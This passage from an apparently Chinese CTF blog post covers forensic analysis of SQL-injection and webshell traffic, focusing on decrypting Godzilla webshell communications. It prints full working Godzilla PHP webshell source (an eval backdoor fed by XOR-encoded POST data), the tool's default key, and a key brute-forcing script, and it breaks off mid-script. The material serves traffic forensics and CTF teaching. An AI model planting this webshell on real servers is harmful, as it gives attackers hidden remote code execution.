</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>12</span><span class=p>:</span><span class=mi>16</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>press_data</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>12</span><span class=p>:</span><span class=mi>16</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>press_lst</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>press_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=n>press_data</span> <span class=o>&lt;</span> <span class=mi>65000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>x</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>6</span><span class=p>:</span><span class=mi>8</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span> <span class=o>|</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>6</span><span class=p>],</span><span class=mi>16</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=n>y</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span> <span class=o>*</span> <span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>10</span><span class=p>:</span><span class=mi>12</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span> <span class=o>|</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>8</span><span class=p>:</span><span class=mi>10</span><span class=p>],</span><span class=mi>16</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>    <span class=n>plt</span><span class=o>.</span><span class=n>plot</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>,</span><span class=s1>&#39;.&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>plt</span><span class=o>.</span><span class=n>show</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>draw_pic1</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=c1># draw_pic2()</span></span></span></code></pre></td></tr></table></div></div><h2 class=heading-element id=sql注入流量分析><span>SQL注入流量分析</span>
<a href=#sql%e6%b3%a8%e5%85%a5%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>可以使用 wireshark 的过滤器过滤出注入的流量，然后导出特定分组</p><p>然后使用 tshark 根据字段名提取出所有的注入语句</p><p>如果是盲注的话，直接写个正则匹配脚本提取数据即可</p><p>例题1-2023 铁三 traffic</p><h2 class=heading-element id=webshell流量分析><span>Webshell流量分析</span>
<a href=#webshell%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>Tips：如果返回的响应数据是gzip格式，要注意提取的位置，gzip的文件头是<code>1F 8B 08 00</code></p><h3 class=heading-element id=菜刀流量分析><span>菜刀流量分析</span>
<a href=#%e8%8f%9c%e5%88%80%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>菜刀流量的一个明显的特征就是，响应里可能有 <code>->| |&lt;-</code> 这样的字符串</p><p><img loading=lazy src=/posts/5422d65/imgs/image-20250419164405745.png alt=/posts/5422d65/imgs/image-20250419164405745.png height=1528 width=2560></p><p>流量分析和解密上没啥难度，一般就是简单的明文流量或者就Base64编码了一下</p><h3 class=heading-element id=哥斯拉流量分析><span>哥斯拉流量分析</span>
<a href=#%e5%93%a5%e6%96%af%e6%8b%89%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>考链接：<a href=https://250.ac.cn/2021/01/12/Godzilla%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/ target=_blank rel="external nofollow noopener noreferrer">https://250.ac.cn/2021/01/12/Godzilla%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</a></p><blockquote><p>哥斯拉的默认密钥为：3c6e0b8a9c15224a</p></blockquote><p>哥斯拉流量一般的加密方式就是异或，当然在插件的加持下可能也会用到AES</p><p>我们以下面这个编码器为例子，这里要注意异或的时候，是从密钥的第二位开始异或</p><p>因此当我们使用CyberChef解密的时候，需要把密钥的第一位移到最后</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>encode</span><span class=p>(</span><span class=nv>$D</span><span class=p>,</span><span class=nv>$K</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=nv>$i</span><span class=o>&lt;</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$D</span><span class=p>);</span><span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$c</span> <span class=o>=</span> <span class=nv>$K</span><span class=p>[</span><span class=nv>$i</span><span class=o>+</span><span class=mi>1</span><span class=o>&amp;</span><span class=mi>15</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=nv>$D</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$D</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span><span class=o>^</span><span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$D</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>一般简单的哥斯拉流量的题目，知道上面这个就能够解密了</p><p>当然，也会有题目会考察选手对哥斯拉细节的理解</p><p>因此我们就拿下面这个哥斯拉的Webshell为例子，深入分析一下哥斯拉流量的加密流程</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>session_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>set_time_limit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 编码器
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>function</span> <span class=nf>encode</span><span class=p>(</span><span class=nv>$D</span><span class=p>,</span><span class=nv>$K</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=nv>$i</span><span class=o>&lt;</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$D</span><span class=p>);</span><span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$c</span> <span class=o>=</span> <span class=nv>$K</span><span class=p>[</span><span class=nv>$i</span><span class=o>+</span><span class=mi>1</span><span class=o>&amp;</span><span class=mi>15</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=nv>$D</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$D</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span><span class=o>^</span><span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$D</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$pass</span><span class=o>=</span><span class=s1>&#39;babyshell&#39;</span><span class=p>;</span> <span class=c1>// 哥斯拉的连接密码
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$payloadName</span><span class=o>=</span><span class=s1>&#39;payload&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$key</span><span class=o>=</span><span class=s1>&#39;421eb7f1b8e4b3cf&#39;</span><span class=p>;</span><span class=c1>// 哥斯拉流量的解密密钥
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=nv>$pass</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$data</span><span class=o>=</span><span class=nx>encode</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=nv>$pass</span><span class=p>]),</span><span class=nv>$key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=nv>$payloadName</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$payload</span><span class=o>=</span><span class=nx>encode</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=nv>$payloadName</span><span class=p>],</span><span class=nv>$key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>strpos</span><span class=p>(</span><span class=nv>$payload</span><span class=p>,</span><span class=s2>&#34;getBasicsInfo&#34;</span><span class=p>)</span><span class=o>===</span><span class=k>false</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nv>$payload</span><span class=o>=</span><span class=nx>encode</span><span class=p>(</span><span class=nv>$payload</span><span class=p>,</span><span class=nv>$key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    		<span class=k>eval</span><span class=p>(</span><span class=nv>$payload</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nx>substr</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$pass</span><span class=o>.</span><span class=nv>$key</span><span class=p>),</span><span class=mi>0</span><span class=p>,</span><span class=mi>16</span><span class=p>);</span> <span class=c1>// 输出MD5(连接密码+流量解密密钥)的前16位
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>echo</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>encode</span><span class=p>(</span><span class=o>@</span><span class=nx>run</span><span class=p>(</span><span class=nv>$data</span><span class=p>),</span><span class=nv>$key</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nx>substr</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$pass</span><span class=o>.</span><span class=nv>$key</span><span class=p>),</span><span class=mi>16</span><span class=p>);</span> <span class=c1>// 输出MD5(连接密码+流量解密密钥)的后16位
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>strpos</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=s2>&#34;getBasicsInfo&#34;</span><span class=p>)</span><span class=o>!==</span><span class=k>false</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nv>$_SESSION</span><span class=p>[</span><span class=nv>$payloadName</span><span class=p>]</span><span class=o>=</span><span class=nx>encode</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=nv>$key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>仔细观察上面的Webshell源码，关键部分我已经写上了对应的注释</p><p>哥斯拉流量解密的关键就在于<code>$key</code>这个密钥上，假如这个密钥未知，我们有什么办法去得到它呢</p><p>第一种最简单方法就是看看流量中有没有上传Webshell的源码，如果有，可以从源码中获得</p><p>第二种方法是我们可以结合请求和响应包中的数据，尝试去爆破这个解密密钥</p><p>这种方法就考察了哥斯拉流量的加密流程，因此我们需要去逆向分析一下这个密钥是如何生成的</p><p>Github上有开源的逆向后的源码：<a href=https://github.com/Freakboy/Godzilla target=_blank rel="external nofollow noopener noreferrer">https://github.com/Freakboy/Godzilla</a></p><p>其中，我们主要关注下面这段代码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=nf>generate</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>password</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>secretKey</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>Generate</span><span class=p>.</span><span class=na>GenerateShellLoder</span><span class=p>(</span><span class=n>password</span><span class=p>,</span><span class=w> </span><span class=n>functions</span><span class=p>.</span><span class=na>md5</span><span class=p>(</span><span class=n>secretKey</span><span class=p>).</span><span class=na>substring</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>16</span><span class=p>),</span><span class=w> </span><span class=kc>false</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>我们可以发现，哥斯拉的流量解密密钥是明文密钥MD5的前十六位，而这个明文密钥一般是可读的字符串</p><p>然后结合响应包中，会输出输出MD5(连接密码+流量解密密钥)的值</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>eval</span><span class=p>(</span><span class=nv>$payload</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>substr</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$pass</span><span class=o>.</span><span class=nv>$key</span><span class=p>),</span><span class=mi>0</span><span class=p>,</span><span class=mi>16</span><span class=p>);</span> <span class=c1>// 输出MD5(连接密码+流量解密密钥)的前16位
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>encode</span><span class=p>(</span><span class=o>@</span><span class=nx>run</span><span class=p>(</span><span class=nv>$data</span><span class=p>),</span><span class=nv>$key</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>substr</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$pass</span><span class=o>.</span><span class=nv>$key</span><span class=p>),</span><span class=mi>16</span><span class=p>);</span> <span class=c1>// 输出MD5(连接密码+流量解密密钥)的后16位
</span></span></span></code></pre></td></tr></table></div></div><p>因为连接密码可以从请求包中得到，就是请求包中POST传参的参数</p><p>因此，我们就可以尝试写一个脚本去爆破密钥</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>md5_encode</span><span class=p>(</span><span class=n>text</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>text</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>crack_key</span><span class=p>(</span><span class=n>key_list</span><span class=p>,</span><span class=n>target_hash</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pwd</span> <span class=o>=</span> <span class=s2>&#34;Antsword&#34;</span> <span class=c1># 哥斯拉的连接密码</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>key</span> <span class=ow>in</span> <span class=n>key_list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>tmp</span> <span class=o>=</span> <span class=n>md5_encode</span><span class=p>(</span><span class=n>key</span><span class=p>)</span> <span class=c1># 明文密钥的MD5</span>
</span></span><span class=line><span class=cl>        <span class=n>tmp_hash</span> <span class=o>=</span> <span class=n>md5_encode</span><span class=p>(</span><span class=n>pwd</span><span class=o>+</span><span class=n>tmp</span><span class=p>[:</span><span class=mi>16</span><span class=p>])</span> <span class=c1># 响应中返回的hash</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>tmp_hash</span> <span class=o>==</span> <span class=n>target_hash</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 密钥爆破成功: </span><span class=si>{</span><span class=n>key</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 用于解密哥斯拉流量的密钥为 </span><span class=si>{</span><span class=n>tmp</span><span class=p>[:</span><span class=mi>16</span><span class=p>]</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>key</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># 响应中返回的hash</span>
</span></span><span class=line><span class=cl>    <span class=n>target_hash</span> <span class=o>=</span> <span class=s2>&#34;e71f50e9773b23f9792dea3a7ae385ca&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;dic.txt&#34;</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>key_list</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>crack_key</span><span class=p>(</span><span class=n>key_list</span><span class=p>,</span> <span class=n>target_hash</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># [+] 密钥爆破成功: Antsw0rd</span>
</span></span><span class=line><span class=cl><span class=c1># [+] 用于解密哥斯拉流量的密钥为 a18551e65c48f51e</span></span></span></code></pre></td></tr></table></div></div><p>当然也可以直接用CTF-NetA爆破</p><p><img loading=lazy src=/posts/5422d65/imgs/image-20250515121809838.png alt=/posts/5422d65/imgs/image-20250515121809838.png height=980 width=1500></p><p>例题1-2024福建省数据安全大赛-gza_Cracker</p><p>例题2-2020HITCTF-Traffic</p><p>附：哥斯拉密钥爆破+流量批量解密脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>io</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>gzip</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.parse</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>url_decode</span><span class=p>(</span><span class=n>encoded_str</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>unquote</span><span class=p>(</span><span class=n>encoded_str</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>xor_decode</span><span class=p>(</span><span class=n>data</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>,</span> <span class=n>key</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)):</span>
